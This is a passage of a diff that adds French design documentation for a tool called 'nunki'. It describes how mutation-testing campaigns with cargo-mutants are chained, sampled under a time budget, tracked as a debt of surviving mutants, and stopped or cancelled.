+   fichier du dossier de mission que le HQ lit.
+
+   **Aux niveaux `standard` et `critical`, les campagnes d'une mission
+   forment une chaîne, dont l'unité est le fichier** (un `prototype` ne doit
+   aucune campagne). La première est complète. Une suivante est
+   **partielle** : elle ne mute que les fichiers touchés dont le contenu a
+   changé depuis le `HEAD` de la précédente, avec toujours le point de
+   fourche dans `NUNKI_BASE` — dans ces fichiers, tout ce que la branche a
+   changé est muté de nouveau. Conditions, toutes requises : la campagne
+   précédente est enregistrée ; la porte 7 passe sur elle ; son `HEAD` est un
+   ancêtre de `HEAD` ; elle est partie du même point de fourche ; elle a
+   donné des comptes par fichier qui font son total, sous des chemins que
+   `nunki` lui avait confiés ; les fichiers changés ont pu être listés, et
+   chaque fichier compté qui n'a pas changé est touché et présent à `HEAD` ;
+   le `mutation.sh` et la version de l'outil de chaque stack que la campagne
+   appelle — celles qui portent un chemin touché — sont inchangés ; une stack
+   que la branche n'a pas touchée n'est pas appelée, et ne compte pas ;
+   `--again` n'a pas été demandé. Sinon la campagne est complète, et sa raison
+   est écrite dans `MUTANTS.json`.
+
+   **Au niveau `critical`, la chaîne sert jusqu'à `Verified` et jusqu'à
+   `nunki push`.** La reconstruction y est jugée sans seuil : chaque
+   survivant qu'elle liste, gardé d'un fichier inchangé ou trouvé par la
+   dernière campagne, doit recevoir une issue. Quand toutes les autres
+   étapes dues sont vertes (`CLEAR`, une levée, ou des tours épuisés sans
+   rien à lever), la porte 7 est jouée de nouveau, seule, au `HEAD` final :
+   une campagne enregistrée sur son contenu et qui passe, partielle ou
+   complète, rend la mission `Verified`. Quand rien n'a bougé `HEAD` depuis
+   les portes, c'est leur campagne, et rien ne tourne de nouveau ; un commit
+   venu après elles doit une campagne, partielle si la chaîne le permet. Des
+   survivants, et c'est un volet, compté dans la borne. `nunki push`, au
+   niveau `critical`, exige que la campagne enregistrée ait tourné sur le
+   contenu du commit poussé et passe ; son refus nomme
+   `nunki mission mutants <id>`. Mesuré sur une mission `critical` de ce
+   dépôt : sept campagnes complètes d'environ deux heures, là où la chaîne
+   en aurait demandé une ou deux. Et sur trois missions `critical`, une
+   campagne complète de plus au `HEAD` final a coûté 109 minutes, 36 en
+   moyenne, pour refaire à peu près la mesure de la première campagne
+   complète : c'est pourquoi aucune n'est due à la fin.
+
+   `MUTANTS.json` garde, pour chaque fichier touché, les comptes de la
+   dernière campagne qui l'a mesuré. Un fichier inchangé garde ses comptes et
+   ses survivants, sous les règles de report ; un fichier changé, supprimé ou
+   renommé les tient de la nouvelle campagne seule. La porte 7 et
+   `nunki push` jugent cette reconstruction **une seule fois** : la part du
+   total essayé, telle qu'une campagne complète à `HEAD` la donnerait. Aucun
+   diff n'est lu ligne à ligne : deviner ce qu'un changement atteint a été
+   contourné trois fois, comparer des contenus de fichiers ne l'est pas. La
+   limite, écrite avec son remède : un mutant mesuré dans un fichier que
+   personne n'a changé est supposé exister encore et être encore tué. Un
+   test modifié ou supprimé, ou tout autre changement d'un fichier touché,
+   peut laisser revivre un mutant d'un fichier inchangé, et aucune campagne
+   partielle ne le voit, à aucun niveau. Dans la mission, le seul remède est
+   `--again`, à la main ; hors mission, c'est la campagne sur tout le code
+   (plus bas, « Des campagnes hors mission »).
+
+   **Un budget de temps, mesuré sur un échantillon choisi d'avance.** Le
+   `mutation_minutes` d'une mission est le budget de chacune de ses
+   campagnes. Le délai, le budget et sa moitié encore (68 minutes pour 45),
+   ne sert plus qu'à arrêter une campagne bloquée ; la porte et le lanceur le
+   lisent par la même fonction. `nunki` passe au script le budget en
+   secondes (`NUNKI_MUTATION_BUDGET`), la durée d'un mutant sur la dernière
+   campagne du projet qui en a essayé au moins cinq (`NUNKI_MUTATION_PACE`,
+   gardée dans `campaign-pace.json`, au HQ du projet ; le script suppose 60
+   secondes sans elle), et, à une campagne partielle, la fraction de la
+   campagne qu'elle continue (`NUNKI_MUTATION_SAMPLE`). Le script Rust liste
+   les mutants que sa portée atteint (`--list --json`). S'ils ne tiennent pas
+   dans le budget — autant de mutants que de fois la durée dans le budget,
+   moins un pour la référence, qui reconstruit le crate comme un mutant —,
+   il n'en mesure qu'une fraction, 1/*k*, *k* le plus petit qui tienne.
+
+   Le choix précède la campagne, parce que les mutants essayés avant une
+   coupure ne sont pas un échantillon : ils suivent l'ordre de l'outil. Il
+   suit la clé qui reporte les avis, le même fichier et la même description,
+   jamais la ligne : un mutant est pris quand le hachage de sa clé, écrit en
+   `jq` et le même sur jq 1.6 et 1.8.2, vaut 0 modulo *k*. Un mutant qu'un
+   retour au codeur n'a pas changé reste donc dans l'échantillon, et un
+   mutant ajouté ailleurs ne redistribue pas les autres ; un choix par
+   position (`--shard`) les redistribuerait, et chaque retour amènerait des
+   survivants jamais vus. L'échantillon passe à l'outil en un seul `-F`,
+   l'alternative des noms choisis, échappés là où la syntaxe des
+   expressions de Rust les lirait, et il est vérifié avant de tourner :
+   `--list` avec ce filtre doit nommer exactement les mutants choisis.
+   Mesuré sur 27.1.0 : des noms comme `replace <impl Spawner for
+   ContainerSpawner>::alive -> io::Result<u8>` ou `vec![Box::leak(…)]`
+   reviennent exacts. Un listage qui échoue, un filtre qui ne prend pas ce
+   qui a été choisi, ou un échantillon vide quand la portée porte des
+   mutants : la campagne n'a rien mesuré, et le dit — jamais de repli sur le
+   tout. Sans budget ni fraction, comme d'un `nunki` plus ancien, elle tourne
+   entière, sans liste.
+
+   Le script dit, avant sa ligne de fin, sur quoi la campagne a tourné :
+   `{"sampled":k,"listed":N,"paced":s,"pace":m}`. Sous le filtre, les comptes
+   de l'outil sont ceux de l'échantillon (mesuré sur 27.1.0), si bien que la
+   porte 7 juge l'échantillon comme un tout : le seuil au niveau `standard`,
+   une issue pour chaque survivant de l'échantillon au niveau `critical`.
+   `MUTANTS.json` garde la fraction dans la chaîne, et `mission status` la
+   dit : « a sample of 1/3 of 48 ». **Une campagne partielle tourne à la
+   fraction de la campagne qu'elle continue**, même quand ses quelques
+   fichiers tiendraient entiers : la reconstruction reste un seul
+   échantillon. À une autre fraction, elle n'est pas enregistrée seule. Une
+   campagne complète — la première, `--again`, une chaîne rompue — fixe la
+   sienne. Changer le script change ce avec quoi la campagne tourne, et la
+   suivante est complète : un hachage changé ne redistribue jamais un
+   échantillon au milieu d'une chaîne.
+
+   Mesuré sur cargo-mutants 27.1.0, dans l'image Rust, sur ce dépôt : les
+   48 mutants d'un diff, avec un budget qui en laisse tenir 16, donnent un
+   échantillon de 1/3, 18 mutants. Le filtre est vérifié, seuls ces 18
+   tournent, et chacun a la même issue que dans la campagne entière (17
+   tués, 1 non viable). Un commit de plus, qui ajoute 9 mutants dans un
+   autre fichier, à la fraction de la chaîne : l'échantillon garde les 18
+   et en prend 4 des 9 nouveaux, aucun n'en sort. Le motif, sur un projet
+   Rust + Next.js : une campagne a compté 514 mutants à environ 47 secondes
+   chacun, soit environ 6,5 heures, quand le délai par défaut était de 45
+   minutes.
+
+   La stack Rust d'abord : rien n'est vérifié de mutmut ni de Stryker, et
+   leurs scripts ignorent le budget. Sur un projet à plusieurs stacks, la
+   stack Rust reçoit tout le budget et les autres tournent entières après
+   elle, sous le même délai : c'est une limite, écrite. Ce qu'on perd : un
+   vrai survivant hors de l'échantillon passe la mission, et c'est la
+   campagne hors mission (plus bas) qui le trouverait. Après la mise à
+   jour, une campagne enregistrée comme arrêtée à son délai d'avant — le
+   budget lui-même — est due de nouveau une fois, puisque le délai est
+   désormais plus long.
+
+   **Des campagnes hors mission, lancées par l'humain.** `nunki` n'a aucun
+   ordonnanceur : `nunki mutants run --slot <slot>` en lance une quand
+   l'humain le veut, sous trois formes. Sans option, sur les fichiers
+   changés depuis la dernière campagne hors mission terminée, chacun muté en
+   entier, qui rattrape ce que les échantillons ont laissé : `NUNKI_BASE`
+   est l'arbre vide, si bien que chaque ligne d'un fichier remis compte pour
+   changée (mesuré sur cargo-mutants 27.1.0 : `--in-diff` contre lui donne
+   les mêmes mutants que `--file`), et qu'un fichier retiré, ou sans rien à
+   muter, est une mesure de rien — sans point de fourche, `--file` sur l'un
+   ou l'autre ne laisse aucun `outcomes.json`, que le script lit comme une
+   campagne qui n'a pas pu tourner, et la suivante remesurerait le même
+   intervalle sans fin (mesuré aussi). Avec `--whole`, sur tout le code et sans point
+   de fourche : chaque fichier suivi, que chaque stack lit à sa façon
+   (mesuré sur cargo-mutants 27.1.0 : un chemin qui n'est pas du Rust est
+   ignoré) ; seule celle-ci ferme la limite de la chaîne. Sans campagne
+   terminée, la première forme est refusée et nomme `--whole` ; sur une base
+   qui n'a pas bougé depuis, rien ne part. La troisième, `--owed`, sur les
+   survivants de la dette par leur nom, est plus bas : c'est ce qui solde
+   ceux qu'un test tue.
+
+   Elle tourne sur la base telle que le dépôt de l'humain l'a — le commit
+   que l'hôte enregistre, jamais une ref du slot —, dans la copie propre
+   d'un slot qu'aucune mission ne tient, remise à ce commit sans que le
+   checkout du slot bouge. Un slot qu'une mission tient est refusé, en la
+   nommant ; un slot où aucune mission n'a jamais tourné aussi, faute de
+   conteneur. Pas de budget, donc pas d'échantillon : c'est ici que le tout
+   se mesure, sous un délai qui n'arrête qu'une campagne bloquée
+   (`--minutes`, 720 par défaut). Son dossier en vol est celui du slot,
+   celui que toute porte de la copie consulte, marqué hors mission : la
+   lecture d'une mission le refuse — le lancement de sa campagne, celui de
+   son run — en nommant `nunki mutants status`, si bien qu'une campagne hors
+   mission n'est jamais enregistrée comme celle d'une mission.
+
+   **Demander ne lance jamais.** `nunki mutants run` refuse tant qu'une
+   campagne est déposée dans le slot. `nunki mutants status` la relit — il
+   interroge le conteneur, au contraire de `nunki mission mutants --status`
+   — et ne lance jamais rien : une boucle qui l'interroge attend sans
+   lancer. Relue, une campagne qui a dit avoir fini et a mesuré, par les
+   mêmes règles qu'une campagne de mission, entre dans la **dette** du
+   projet (`mutants-debt.json`, au HQ), le registre des équivalences
+   appliqué. Une campagne sur tout le code la remplace. Une campagne sur les
+   fichiers changés depuis y remplace, pour chacun d'eux — retirés et
+   renommés compris —, ce qui était dû par ce qu'elle y a trouvé, et laisse
+   tels quels les survivants des fichiers inchangés : la règle de la chaîne
+   (plus haut), et son hypothèse, qu'un mutant mesuré dans un fichier que
+   personne n'a changé depuis existe encore et survit encore. Aucun hunk
+   n'est lu. Remesurer les seules lignes changées laissait dû un survivant
+   que personne n'avait remesuré, à une ligne qu'une édition avait
+   déplacée, et un nouveau survivant pouvait prendre son entrée sous la
+   même clé : la description nomme la fonction, pas la position (mesuré sur
+   cargo-mutants 27.1.0 : `a > b && c > d` donne deux survivants `replace >
+   with == in keep`). Les survivants d'un fichier viennent donc tous d'une
+   même campagne, et deux sous la même clé restent deux ; un survivant
+   retrouvé porte ce que sa campagne en a dit, jamais ce qu'en disait une
+   plus ancienne. Une campagne déposée avant cette règle, sur les seules
+   lignes changées, ne retire rien par fichier ; dans tous les cas, un
+   survivant trouvé sous un identifiant déjà dû remplace son entrée, si bien
+   que deux entrées de la dette n'ont jamais le même. Une campagne arrêtée
+   court, ou qui n'a rien mesuré, laisse la dette telle qu'elle était. Une
+   campagne par nom, `--owed`, n'y touche qu'aux survivants qu'elle a nommés
+   (plus bas).
+
+   **Le HQ tranche la dette une fois pour le projet, dans le registre des
+   équivalences que les missions lisent**, plutôt qu'une fois par mission
+   qui retombe sur le même mutant. `nunki mutants debt` la liste : chaque
+   survivant, le commit qui l'a trouvé, la proposition du registre s'il en
+   porte une, et les survivants qui partagent une mutation.
+   `--equivalent <survivant> --because <pourquoi>` inscrit l'avis au
+   registre, aux mêmes conditions qu'un avis de mission : la dette ne porte
+   qu'un survivant sur ce fichier et cette description, et le code que la
+   mutation remplace n'apparaît qu'une fois dans son fichier, lu au commit
+   qui l'a trouvé dans le dépôt de l'humain — jamais dans un slot, qu'une
+   mission suivante réutilise. L'entrée nomme pour mission la campagne qui
+   l'a trouvé, `off-mission-` et les douze premiers caractères de son
+   commit. Le registre d'abord, la dette ensuite : hors mission, rien
+   d'autre ne porte l'avis, si bien qu'un avis que le registre ne peut
+   prendre n'est rien — le verbe le dit, le survivant reste dû, et seul un
+   test le solde. Une dette qui ne peut être écrite une fois l'avis pris est
+   dite telle, l'avis au registre et le survivant encore listé ; la même
+   commande redonnée solde la dette sans rien inscrire deux fois — l'entrée
+   remplace la sienne, et une ratification déjà inscrite par le même
+   humain, pour la même campagne, ne l'est pas de nouveau.
+   `--ratify <survivant>` ratifie la proposition du registre, avec sa
+   phrase : l'entrée garde son origine et inscrit la ratification à côté,
+   comme sur une mission. Mais une proposition de la dette reste sur son
+   survivant d'une campagne à l'autre, quand celle d'une mission est refaite
+   à chaque campagne et levée avec l'avis : si l'entrée dont elle vient a
+   été levée ou remplacée depuis, la ratifier remettrait un avis levé, ou
+   écraserait un avis plus récent sur la même mutation. L'entrée n'est donc
+   celle de la proposition que telle qu'elle était — même mutation, même
+   mission, même commit, même date, même phrase : levée puis redonnée, sur
+   la même campagne même, c'est un autre avis. Sinon la ratification est
+   refusée, le registre et la dette laissés tels quels, la liste la dit
+   telle, et `--equivalent` tranche de nouveau. Une proposition sur un
+   survivant qui partage sa mutation avec un autre de la dette est refusée
+   aussi : le registre ne les distingue pas, et seul un test les solde.
+   `--ratify --all` imprime chaque proposition ratifiable, puis ratifie
+   exactement la liste imprimée, en une seule écriture du registre, ou
+   rien. Un survivant tranché quitte la
+   dette ; la campagne suivante qui le retrouve, son code inchangé, le
+   rapporte comme une proposition du registre, qui propose et ne tranche
+   jamais : après une campagne sur tout le code, `--ratify --all`. La dette
+   est lue et écrite sous son propre verrou ; `nunki mutants status` le
+   prend avant d'oublier la campagne qu'il relit, qui reste déposée tant
+   qu'il est tenu, et relit sous lui le dossier en vol : une campagne qu'un
+   autre `status` a déjà relue ne l'est pas deux fois, et le dossier d'une
+   campagne suivante n'est pas oublié à sa place.
+
+   Ce qu'on perd : ces cas ne sont rattrapés que quand l'humain lance une
+   campagne ; le minimum conseillé est une campagne sur tout le code avant
+   chaque mise en production. Limite, écrite : le disque. Le balayage et le
+   plancher de 2 Gio valent pour elle comme pour une campagne de mission,
+   mais ce que le balayage libère sur un gros crate n'est pas mesuré
+   (environ 11 Go par heure sans lui) ; sur un disque presque plein et
+   partagé, le plancher l'arrêtera avant la fin.
+
+   **Ce qui solde le reste de la dette : une mission de durcissement, puis
+   une campagne par nom.** `nunki mission new <mission> --branch <branche>
+   --harden` cadre une mission au niveau `standard`, sous la forme code seul,
+   dont le brief tient en une ligne : tuer ces survivants. `nunki` fige dans
+   son en-tête (`hardening:`) les survivants qu'elle prend à la dette, et
+   écrit son lot et son brief, qui les nomme un à un. Figés plutôt que lus
+   dans la dette, qu'une campagne ou un avis peut changer sous une mission
+   déjà cadrée. Elle prend, dans l'ordre de la dette, les plus anciens
+   d'abord, ceux qu'une stack sait mesurer par leur nom — son `mutation.sh`
+   le dit (plus bas) — et dont le fichier n'a pas changé, dans le dépôt de
+   l'humain, entre le commit qui les a trouvés et la base : un nom porte une
+   ligne et une colonne, et un fichier changé depuis peut l'avoir déplacé.
+   Elle laisse ceux que le registre propose comme équivalents — aucun test
+   ne les tue, et `--ratify` les solde ; tous, quand le registre ne peut être
+   lu pour dire qu'une proposition est tombée — et n'en prend pas plus que
+   le budget de sa campagne n'en mesure au rythme du projet, pour que sa
+   porte 7 les mesure tous plutôt qu'un échantillon. C'est un but, pas une
+   garantie : le rythme est celui que le projet a au cadrage, et la campagne
+   mesure aussi ce que la branche change. Si le rythme monte avant le
+   lancement, ou si la branche ajoute du code à muter, l'union ne tient plus
+   dans le budget, et la campagne en mesure un échantillon, comme toute
+   autre. Le verbe dit combien restent dus, et pourquoi ; une dette qui n'a
+   rien à lui donner ne cadre rien.
+
+   Une mission qui n'écrit que des tests n'atteint aucun mutant par son
+   diff : un fichier sous `tests/` n'est jamais muté (mesuré sur
+   cargo-mutants 27.1.0). Sa porte 7 remesure donc ses survivants **par leur
+   nom**, en plus de ce que sa branche a changé, par le filtre de la règle du
+   budget. Sa campagne est toujours complète. Ses chemins sont ceux que la
+   branche a touchés et les fichiers de ses survivants, et son empreinte
+   porte leur contenu et les noms : un rebase qui change un de ces fichiers
+   est un autre contenu. Le script reçoit les noms dans
+   `NUNKI_MUTATION_NAMES`, liste ce que sa portée atteint et les mutants
+   nommés dans les fichiers donnés, et tourne sur l'union des deux listes,
+   par nom, sous un seul `-F` : mesuré sur 27.1.0, deux `-F` prennent ce que
+   l'un ou l'autre prend, et un `-F` choisit dans `--in-diff` ou `--file`,
+   jamais au-delà. L'échantillon du budget est tiré de cette union. Un nom
+   absent du code — sa ligne a bougé, ou le code qu'il remplace a changé —
+   fait une campagne qui n'a rien mesuré, et qui le dit : tournée sans lui,
+   elle compterait tué un mutant qu'elle n'a jamais essayé. Mesuré aussi : un
+   module `#[cfg(test)]` ajouté en fin de fichier laisse les noms tels quels,
+   une ligne ajoutée au-dessus les décale tous. Le brief le dit au codeur.
+   Ce que sa branche change au code est mesuré comme dans toute mission.
+
+   Ses tests ne soldent la dette qu'une fois sur la base. `nunki mutants run
+   --owed` remesure les survivants de la dette par leur nom, et rien
+   d'autre, sur la base telle que le dépôt de l'humain l'a, ceux qui sont
+   mesurables aux mêmes conditions : le point de fourche est le commit de la
+   base lui-même, si bien que le diff est vide et que seuls les noms
+   tournent. Relue, chacun qu'un test tue quitte la dette, chacun qui survit
+   encore y revient, trouvé à ce commit, et les autres restent tels quels.
+   Ce que la dette a mesuré en dernier ne bouge pas : une campagne sur ce qui
+   a changé depuis repart de la dernière qui a mesuré des fichiers. Sans
+   elle, le survivant d'un fichier que personne ne change plus resterait dû
+   jusqu'à la prochaine campagne sur tout le code. Une campagne reçoit au
+   plus 64 Kio de noms : Linux refuse de lancer un programme dont un
+   argument ou une variable d'environnement dépasse 128 Kio — lu, pas
+   mesuré —, et entre plusieurs stacks les noms voyagent dans l'argument
+   unique de `sh -c`. Au-delà, les plus anciens d'abord, et la campagne
+   suivante prend la suite, puisqu'un survivant retrouvé revient en fin de
+   dette.
+
+   Limites, écrites : seule la stack Rust mesure par nom, et les survivants
+   des autres attendent une campagne sur tout le code ; une base qui bouge
+   après le cadrage et change le fichier d'un survivant fait une campagne qui
+   ne mesure rien, et c'est une nouvelle mission de durcissement qui le
+   reprend.
+
+   **Le contrat de `mutation.sh` s'enrichit**, tout en restant facultatif
+   pour une stack qui ne veut pas de chaîne :
+   - une ligne `# nunki-tool-version: <commande>`, que `nunki` lance dans la
+     copie propre, là où la campagne lance le script de la stack — son propre
+     dossier quand le projet en porte plusieurs —, pour lire la version de
+     l'outil (sans elle, chaque campagne est complète). Une version illisible
+     rend la campagne complète, et sa raison nomme la stack, la commande et
+     ce qu'elle a répondu ;
+   - des lignes par fichier avant la ligne de fin,
+     `{"measured":"<chemin>","tried":N,"found":M}`, annoncées par
+     `"by_file":true` sur la ligne de fin, qui font ses totaux ;
+   - `"missed":K` sur la ligne de fin, le nombre de survivants que l'outil a
+     rapportés, pris dans son propre compte (plus haut). Le script Rust lit
+     tout dans le `outcomes.json` de cargo-mutants — chaque résultat y porte
+     le nom, le fichier et l'étendue de son mutant, et le fichier se termine
+     sur les totaux de l'outil — et **écrit chaque ligne JSON avec `jq`**
+     (1.6, celui de l'image) : aucune ligne n'est plus échappée à la main.
+     Mesuré sur 27.1.0 avec une tabulation et un saut de ligne dans des noms
+     de fichiers : les dix survivants sont enregistrés, chacun sous son
+     fichier. Là où `nunki` affiche le nom d'un survivant, ses caractères de
+     contrôle sont échappés, tabulation et saut de ligne compris. Les
+     scripts Python et Next écrivent leurs lignes avec un encodeur JSON et ne
+     donnent pas ce compte : leurs outils ne tiennent pas de total à eux sur
+     les fichiers touchés, et un compte tiré de la liste qui fait les lignes
+     s'accorderait toujours avec elles ;
+   - une ligne `# nunki-by-name: NUNKI_MUTATION_NAMES`, qui dit que le
+     script lit les noms que `nunki` lui confie (plus haut, ce qui solde la
+     dette). `nunki` n'en confie qu'à une stack dont le script la porte, lue
+     dans le home du projet pour choisir les survivants, et de nouveau dans
+     la copie propre avant de lancer : un script qui ignorerait les noms
+     mesurerait d'autres mutants que ceux nommés, sans rien dire ;
+   - un diff contre `NUNKI_BASE` lu sans détection de renommage ;
+   - **des chemins pris à la lettre.** Un chemin que `nunki` confie à une
+     campagne peut porter une espace, un deux-points, un guillemet, un
+     caractère hors ASCII ou ressembler à une pathspec : le script les garde
+     dans ses paramètres positionnels, ne les coupe jamais sur une espace, et
+     les passe à git après `--` avec `--literal-pathspecs`. Mesuré avec
+     cargo-mutants 27.1.0 sur des fichiers nommés `:!*.rs`,
+     `src/with space.rs`, `src/with:colon.rs`, `src/with"quote.rs` et
+     `src/é.rs` : l'ancien script n'en trouvait ni n'en essayait aucun et
+     rapportait une campagne finie ; le nouveau trouve leurs 25 mutants. De
+     son côté, la liste des fichiers touchés de la porte 7 se lit séparée par
+     des NUL : un nom qui porte un guillemet ou un caractère hors ASCII y
+     reste tel quel, au lieu de la forme entre guillemets que git en donne
+     ligne à ligne ;
+   - `NUNKI_MUTATION_JOBS`, la valeur de `mutation_jobs` (`nunki.yaml`, un
+     entier d'au moins 1, 1 par défaut) : combien de mutants la campagne peut
+     jouer à la fois. Mesuré sur `nunki` lui-même, deux jobs gagnent 13 % et
+     doublent le disque, et un job par cœur a changé la réponse (des
+     survivants devenus délais dépassés, comptés tués) : d'où 1 ;
+   - **le cache de build est laissé comme la campagne l'a trouvé.** Après une
+     campagne, terminée, échouée ou arrêtée par `nunki`, le cache tient ce
+     que le code non muté demande et rien de ce qu'un mutant a construit.
+     Mesuré : sans cela, une trentaine de campagnes laissaient 6,8 millions
+     de fichiers dans `target/debug/deps`, et un mutant passait de 7 à 70 s.
+     `nunki check --slot` porte une ligne sur ce cache, **ambre** au-delà de
+     250 000 fichiers ou de 50 Gio — un verdict montré et compté, jamais
+     rouge, jamais vert ;
+   - **pendant la campagne, le script Rust balaie et surveille le disque.**
+     L'image garde les informations de débogage à côté des objets : chaque
+     reconstruction d'un mutant écrit des `.dwo` sous de nouveaux noms, et
+     rien ne les retirait avant la fin de la campagne. Mesuré sur un crate
+     dont un mutant prend 47 s : environ 240 Mo par minute, 11 Go par heure,
+     et une campagne arrêtée par `No space left on device` après 11 mutants.
+     Toutes les 30 secondes, un `.dwo` de `target/debug/deps` s'en va quand
+     son nom n'est pas sur la liste du cache et qu'aucune construction n'a
+     touché son fichier depuis dix minutes ; au-dessus d'un job, de même dans
+     les copies. Une reconstruction relie chaque unité inchangée depuis la
+     session incrémentale de rustc sous un nouveau nom, ce qui bouge l'heure
+     de changement d'état (`-cmin`) du fichier, même sous une vieille date
+     de modification : un fichier qu'une construction utilise encore la voit
+     bouger, et ses noms en trop ne coûtent rien. Ce qui remplit le disque,
+     c'est un fichier qu'aucune construction n'utilise plus — une unité
+     qu'un mutant a changée, et celle qu'elle a remplacée — que seuls des
+     noms de `deps` tiennent : son heure s'arrête, et dix minutes plus tard,
+     tous ces noms s'en vont.
+     Aucun test ne lit un `.dwo`, mais une construction en cours, si :
+     mesuré sur cargo-mutants 27.1.0 et ce dépôt, 48 mutants, balayés dès
+     leur écriture et jusque dans les dossiers incrémentaux de rustc, un
+     mutant qui compile a échoué sur `failed to build archive … No such file
+     or directory` et a été compté non viable au lieu de tué — un survivant
+     pourrait s'y cacher. D'où les dix minutes, et les dossiers
+     incrémentaux, jamais balayés. Mesuré sur ce dépôt, mêmes 48 mutants en
+     place : les résultats sont les mêmes, mutant par mutant, avec et sans
+     balayage (40 tués, 8 non viables), et le balayage a retiré 5 946 noms,
+     dont les fichiers pesaient environ 120 Mo, en 19 minutes ; la place
+     libérée n'est pas mesurée. La fuite de ce dépôt est faible ; sur le
+     crate qui l'a montrée, ce que le balayage y retire n'est pas mesuré.
+     Une campagne arrêtée au plancher n'écrit rien dans `MUTANTS.json`, et
+     la porte 7 la lit comme toute campagne qui n'a rien mesuré : rouge, et
+     renvoyée au codeur, qui n'y peut rien. C'est une limite, écrite.
+     Chaque balayage lit aussi l'espace restant sous `target/`. Sous 2 Gio,
+     l'outil est arrêté et la campagne échoue en le disant, avec l'espace
+     restant et le plancher ; sous 2 Gio au départ, elle ne démarre pas. Le
+     plancher est un choix, pas une mesure. Un espace illisible est dit, et
+     la campagne n'est alors pas surveillée. Une campagne qui n'est pas allée
+     au bout nomme le statut de l'outil, et n'explique que celui-là.
+
+   **C'est `nunki` qui la lance, pas l'humain** : sinon le moniteur s'arrête
+   pour un verbe qu'il aurait pu taper lui-même — pour la campagne que
+   personne n'a démarrée, ou pour celle qu'un volet a rendue périmée. Une
+   porte que rien ne peut jouer arrête le flux —
+   c'est ce qui le garde honnête — mais celle-ci est la seule dont l'obstacle
+   soit à la portée de `nunki` : sans campagne, ou avec une campagne sur un
+   autre contenu, il en lance une et regarde de nouveau au tour suivant.
+   `nunki mission mutants` reste, pour l'humain qui en veut une à la main.
+   Sans option, il en lance une dès qu'aucune n'est en vol : une boucle qui
+   l'interroge pour attendre la fin en relance une à chaque fin. Pour suivre
+   une campagne sans risquer d'en lancer une, `nunki mission mutants <id>
+   --status` ne fait que lire le dossier de la campagne en vol et son
+   journal — il ne demande rien au conteneur et ne relit rien — puis les
+   campagnes enregistrées ; `nunki mission status` en donne la même ligne.
+   **Seulement si elle est seule** : une porte 6 injouable à côté, et
+   l'heure de mutation serait dépensée devant un mur que rien ne bouge.
+
+   **Et `--again`, pour ce que l'empreinte ne voit pas.** L'empreinte porte sur les fichiers touchés, mais la réponse
+   d'une campagne dépend aussi de ce avec quoi elle a tourné : le
+   `mutation.sh` de la stack, la version de l'outil, une exclusion ajoutée
+   depuis. Rien de tout cela ne bouge l'empreinte, et sans verbe la seule
+   façon de repasser outre serait de supprimer `MUTANTS.json` à la main — ce
+   qui casse le montage : le moteur remplace le fichier manquant par un
+   répertoire et la mission tombe sur `Is a directory (os error 21)`. Un verbe coûte moins cher que le
+   contournement qu'il remplace. `--again` ne touche pas à une campagne en
+   vol — celle qui tourne est rapportée comme telle — et reste **une décision
+   humaine** : le moniteur ne redemande jamais de lui-même, puisque rejouer
+   coûte l'heure que la section 7 compte.
+
+   **Une campagne arrêtée court est incomplète, et c'est au HQ de choisir.**
+   Arrêtée à son délai (le budget et sa moitié, plus haut), une campagne
+   n'écrivait rien
+   dans `MUTANTS.json` : la porte 7 trouvait ensuite l'échec laissé sur la
+   même empreinte, renvoyait la mission au codeur avec « cette campagne a
+   déjà tourné et n'a rien mesuré », et les survivants déjà rapportés ne
+   voyageaient que dans ce texte.
+
+   Arrêtée à son délai, une campagne l'est **entière**. Le seul pid tenu au
+   dossier est celui du script, et l'arrêter seul laisserait `cargo-mutants`,
+   ses compilations et ses binaires de test rattachés à un autre parent et
+   réécrivant la copie propre en place. L'arrêt passe donc par l'étiquette
+   `NUNKI_RUN` de la campagne, que porte tout ce qu'elle a lancé, à toute
+   profondeur : `TERM`, puis `KILL`. Puis le conteneur est interrogé de
+   nouveau sur ce qui porte encore l'étiquette ; un zombie, qui n'exécute
+   rien, ne compte pas. Si rien ne reste, ou si le conteneur est arrêté ou
+   parti, la campagne est enregistrée comme suit, oubliée, et la copie propre
+   de `HEAD` est remise à son commit par le rafraîchissement que prend toute
+   porte. Le verbe dit que la copie a été remise, ou qu'elle ne l'a pas été,
+   et pourquoi. S'il reste quelque chose, ou si la question n'a pas pu être
+   posée, le dossier de la campagne **reste**, et toute porte de la copie
+   reste fermée. Rien n'est enregistré comme arrêté, et la campagne est
+   rapportée en vol au-delà de son délai, avec les pids restants ou la
+   raison ; la lecture suivante tente l'arrêt de nouveau. Une campagne gelée
+   reste comptée en vol.
+
+   Désormais, ce que le journal de l'outil
+   tenait est enregistré, marqué `"stopped": {"by": "deadline",
+   "minutes": N}`, avec les décisions du HQ reportées comme à tout rejeu, et
+   **sans compte** : la part d'une partie de campagne est la part du mauvais
+   tout. Une campagne incomplète **ne rend jamais la porte 7 verte**, ne
+   répond jamais à `nunki push`, et ne sert jamais de base à une campagne
+   partielle. La porte 7 sur elle attend le HQ — un **mur**, ni un volet ni
+   une campagne due — et le moniteur s'y arrête en nommant les deux voies :
+   relever `mutation_minutes` et `nunki mission reframe --yes`, ce qui doit
+   une nouvelle campagne dès que la borne dépasse celle où elle s'est
+   arrêtée ; ou envoyer au codeur les survivants déjà rapportés par
+   `nunki mission iterate <mission> --because <pourquoi>` (4.5). La porte et
+   le lanceur en décident par la même fonction, et ne peuvent pas se
+   contredire.
+
+   **Le HQ peut annuler une campagne en vol.**
+   `nunki mission mutants <mission> --cancel --because <pourquoi>` l'arrête
+   comme le délai, par la même fonction : entière et confirmée. Une fois
+   l'arrêt confirmé seulement, il l'enregistre incomplète avec
+   `"stopped": {"by": "cancelled", "because": …}`, écrit la raison dans
+   `FOLLOWUP_HQ.md`, et remet la copie propre à son commit. S'il reste
+   quelque chose, ou si la question n'a pas pu être posée, le verbe échoue
+   en nommant les pids ou la raison. Le dossier de la campagne reste alors,
+   aucune porte de la copie ne s'ouvre, rien n'est enregistré, et le même
+   verbe retente l'arrêt. La mission reste à ses portes, où
+   `iterate --because` ou `mutants --again` la reprennent.
+
+   Un changement de profil arrête la campagne en vol de la même façon, mais
+   un reste n'y fait pas échouer la bascule. Le conteneur de l'agent est
+   retiré juste après, et tout ce qu'il tient part avec lui. Le dossier de
+   la campagne n'est oublié qu'une fois ce conteneur retiré, jamais avant ;
+   si le retrait échoue, il reste.
+
+   Une campagne déjà finie est relue et
+   son résultat gardé ; une campagne gelée est refusée, parce que le signal
+   n'atteindrait pas un conteneur en pause et que l'oublier laisserait une
+   campagne que personne ne suit. Limites, écrites : une campagne arrêtée
+   court remplace celle du dossier, et une décision du HQ sur un survivant
